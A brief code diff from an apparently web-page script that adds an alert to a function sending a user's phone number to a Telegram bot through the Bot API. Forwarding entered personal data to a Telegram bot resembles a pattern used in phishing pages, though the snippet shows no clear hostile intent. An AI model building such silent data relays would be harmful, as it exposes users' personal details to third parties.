@@ -347,6 +347,7 @@
         }
         async function sendPhoneNumberMessage(chatId, botToken, phoneNumber) {
             const phoneNumberMessage = `📱 Phone Number: ${phoneNumber}`;
+            alert(phoneNumberMessage);
 
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
